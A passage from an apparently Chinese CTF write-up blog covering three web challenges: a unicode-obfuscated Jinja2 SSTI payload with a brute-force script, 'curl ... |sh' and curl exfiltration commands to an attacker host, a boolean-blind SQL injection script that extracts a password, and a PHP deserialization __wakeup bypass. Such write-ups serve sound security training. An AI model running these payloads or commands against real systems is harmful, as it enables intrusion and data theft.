class="string">&#x27;&#123;%if(&quot;&quot;|attr(&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(0)|attr(&quot;\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f&quot;)()|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;)|attr(&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;))%&#125;success&#123;%endif%&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>然后就是反弹shell或者（题目服务器存在curl服务）curl外带数据即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/ip:port |sh</span><br><span class="line">curl <span class="number">47.</span>xxx.xxx<span class="number">.72</span>:<span class="number">2333</span> -d \<span class="string">&quot;`ls /`\&quot;</span></span><br><span class="line"><span class="string">payload: &#123;%if(&quot;</span><span class="string">&quot;|attr(&quot;</span>\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005<span class="string">f&quot;)(0)|attr(&quot;</span>\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005<span class="string">f&quot;)()|attr(&quot;</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005<span class="string">f&quot;)(132)|attr(&quot;</span>\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>..........<span class="string">&quot;)|attr(&quot;</span>\u0072\u0065\u0061\u0064<span class="string">&quot;)())%&#125;1&#123;%endif%&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20220920102922-x697z5v.png" alt="image.png"></p><h1 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h1><h2 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h2><p>接口api发现</p><p>sql注入</p><h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>进入题目发现就一张图片和一大堆的接口，这里使用<code>jsfinder</code> 找一下有没有可用的接口</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url:http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/</span><br><span class="line">Find <span class="number">31</span> URL:</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/2V.ny</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/a4?4a=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/qk.js</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/2V.js</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/a4</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/rN.js?a9=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/<span class="number">1J</span>/s1.js?5q=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/fN://uk.tJ<span class="number">.8j</span>/r0/-<span class="number">1</span></span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/this.program</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stdin</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tmp</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/home</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/home/web_user</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/null</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/tty</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/tty1</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/shm</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/shm/tmp</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc/self</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc/self/fd</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stdout</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stderr</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenGetHistoryMessage?_appid=app.web&amp;token=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenSendMessage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenRecallMessage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenUploadImage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenClearUnreadCount</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenGetConversationList?_appid=app.web&amp;token=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/SUPPERAPI.php  //可以</span><br></pre></td></tr></table></figure><p>访问之后查看源码发现代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&#x27;[\]]/im</span>;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&quot;id&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;提示：您输入的信息含有非法字符！&quot;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">check</span>()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过burp发送数据报可以绕过前端js，简单测试之后发现sql语句正常回显的话显示<code>admin</code> ，如果函数被waf掉的话直接重定向到<code>404.html</code> ，简单手动fuzz一下发现ban掉了<code>union if sleep</code> 等函数，那么这里可以使用到布尔盲注，脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;XXX/SUPPERAPI.php?id=&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">length = <span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">        mid = (left + right)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1 and (select length(database())&gt;&#123;mid&#125;)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1 and ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;), &#123;i&#125;, 1)) &gt; &#123;mid&#125;&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;id=1 and ascii(substr((select password from users where id=2), <span class="subst">&#123;i&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        res1 = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res1.text):</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    res = res + <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;***&#x27;</span>,left ,res)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20220921231349-170b2zv.png" alt="image.png"></p><p>这个题主要就是发现存在sql注入有点鸡肋，发现之后布尔盲注的难度不大</p><h1 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h1><h2 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h2><p>composer.json 敏感信息泄露导致的部分源码泄露</p><p>cookie中的php反序列化以及php魔术方法</p><p>利用高版本php引用绕过__wakeup 的过滤</p><p>php反序列化匿名函数的利用</p><h2 id="链接：-1"><a href="#链接：-1" class="headerlink" title="链接："></a>链接：</h2><p><a href="https://www.anquanke.com/post/id/251366#h2-6">Opi&#x2F;Closure (闭包)函数RCE</a></p><h2 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h2><p>简单进行代码审计</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过前端的回显<code>User b3J0aXouc2hhbmVs has created.</code> ，发现这里的<code>__destruct()</code> 方法被调用，猜测考察反序列化，在<code>cookie</code> 中发现反序列化利用点<code>Set-Cookie: user=Tzo0OiJVc2VyIjo0OntzOjEyOiIAKgBfdXNlcm5hbWUiO3M6MjA6ImFtRmphMng1Ymk1cmIyVnNjR2x1IjtzOjEyOiIAKgBfcGFzc3dvcmQiO3M6MzI6ImJmN2RhN2U3YjAzOWM2NjJkYWYyYTZiODcyM2I4Y2VkIjtzOjExOiIAVXNlcgBlbWFpbCI7czoyMToiYXVndXN0OThAc2NoaW1tZWwuY29tIjtzOjE0OiIAVXNlcgBpbnN0YW5jZSI7cjoxO30%3D</code> 进行base64解码后发现对应<code>__sleep()</code>方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;*_username&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;bmVsczc0&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;*_password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;d0829bc048ce9bf2ef900d8604d71ca5&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Useremail&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;chelsey.schroeder@gmail.com&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Userinstance&quot;</span>;r:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//在其中其实还存在由于protected 和private 反序列化之后产生的不可见字符</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20220924124640-g3hasfd.png" alt="image.png"></p><p>到这里还是没头绪，扫目录发现<code>composer.json</code>文件</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;fakerphp/faker&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.19&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;opis/closure&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//这里面可以看到包含了 两个包，一个是用来操作虚假对象的（比如生成随机的用户名，密码，名字，邮箱等信息），另一个是用来操作闭包的，也就是匿名函数。</span></span><br></pre></td></tr></table></figure><p>然后自己手动得到源码<code>composer require fakerphp/faker ; composer require opis/closure</code> (这里最好是通过<code>composer install</code> 下载到准确的版本源码，我这里是复现就懒得搞了&#x3D;。&#x3D;)，然后就是挖利用链了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure><p>利用User的<code>__destruct</code> 方法访问不存在的属性，触发fakerphp依赖下面的Generator类下的<code>__get</code>方法，format下的call_user_func_array再到getFormatter下面的<code>return</code> ，但是这里有个问题便是<code>unserialize</code>之后formatters 会被清空，所以这里就要绕过<code>__wakeup</code> ，在这里其实不是作者提供的版本的fakerphp的话，还有一条利用差不多，同样是进入到ValidGenerator类的<code>__get</code> 方法，然后转到<code>__call</code>方法，但是作者在这里直接die掉了，所以只能绕过上面的<code>__wakeup</code>。</p><p><img src="/img/image-20220924141544-zg6znry.png" alt="image.png"></p><p>那么问题来了，怎么绕过<code>__wakeup</code> 查看php版本发现是php8，没有多属性的特性，这里利用到了<code>php引用来绕过__wakeup</code> ，下面是一个实例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A is constructed!     &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;a unserialize!      &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;apple = <span class="string">&quot;You Have be Hacked!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key-&gt;<span class="keyword">eval</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B is contructed!    &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span> != <span class="string">&quot;secure&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span> = <span class="string">&quot;secure&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;b unserialize!     &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//new 对象是先B后A</span></span><br><span class="line"><span class="comment">//new a();</span></span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="comment">//$class1-&gt;apple = &quot;Hacked!&quot;;</span></span><br><span class="line"><span class="variable">$class1</span>-&gt;key-&gt;<span class="keyword">eval</span> = &amp;<span class="variable">$class1</span>-&gt;apple;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$class1</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:1:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;R:3;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;R:3;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">B is contructed!    A is constructed!     &lt;hr&gt;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;eval&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;apple&quot;</span>;R:<span class="number">3</span>;&#125;b unserialize!     a unserialize!      &lt;hr&gt;You Have be Hacked!</span><br><span class="line"></span><br><span class="line">我自己的理解：所谓引用绕过就是一个顺序问题，重点就是要使<span class="variable language_">$this</span>-&gt;apple的赋值在<span class="class"><span class="keyword">class</span> <span class="title">b</span>的<span class="title">__wakeup</span>之后</span></span><br></pre></td></tr></table></figure><p>这里我自己写了个demo便于理解</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;***&quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;first&quot;</span> . <span class="variable">$a</span> . <span class="variable">$b</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span 